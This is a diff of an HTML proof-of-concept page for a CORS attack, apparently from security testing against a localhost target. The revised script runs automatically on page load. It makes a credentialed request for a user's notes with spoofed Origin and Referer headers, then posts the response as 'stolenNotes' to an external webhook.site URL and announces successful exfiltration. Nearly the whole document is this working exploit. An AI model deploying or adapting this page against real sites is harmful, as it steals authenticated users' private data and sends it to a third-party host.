@@ -2,35 +2,44 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>CORS PoC Auto Trigger</title>
+  <title>CORS Exfiltration PoC</title>
 </head>
 <body>
-  <h1>Sending CORS PoC request...</h1>
+  <h1>Sending CORS GET request...</h1>
 
   <script>
+    // Automatically runs when the page loads
     window.onload = function () {
-      fetch("https://localhost/profile", {
-        method: "POST",
+      fetch("https://localhost/get-notes", {
+        method: "GET",
         credentials: "include",
         headers: {
-          "Content-Type": "application/json",
-          "Accept": "*/*",
+          "Accept": "application/json",
           "Referer": "https://34.240.136.99/profile",
           "Origin": "https://34.240.136.99"
-        },
-        body: JSON.stringify({
-          bio: "Hi, I am Alice!",
-          password: "pass"
-        })
+        }
       })
-      .then(response => response.text())
+      .then(res => res.json())
       .then(data => {
-        console.log("Response:", data);
-        alert("Request sent ✅");
+        console.log("Notes received:", data);
+
+        // Step 2: Exfiltrate to webhook.site
+        return fetch("https://webhook.site/f88badbc-b110-4d90-b115-e7dcd7125a7c", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            stolenNotes: data
+          })
+        });
+      })
+      .then(() => {
+        alert("✅ Notes exfiltrated successfully!");
       })
       .catch(error => {
-        console.error("Error:", error);
-        alert("❌ Request failed");
+        console.error("❌ Error:", error);
+        alert("❌ Request failed.");
       });
     };
   </script>
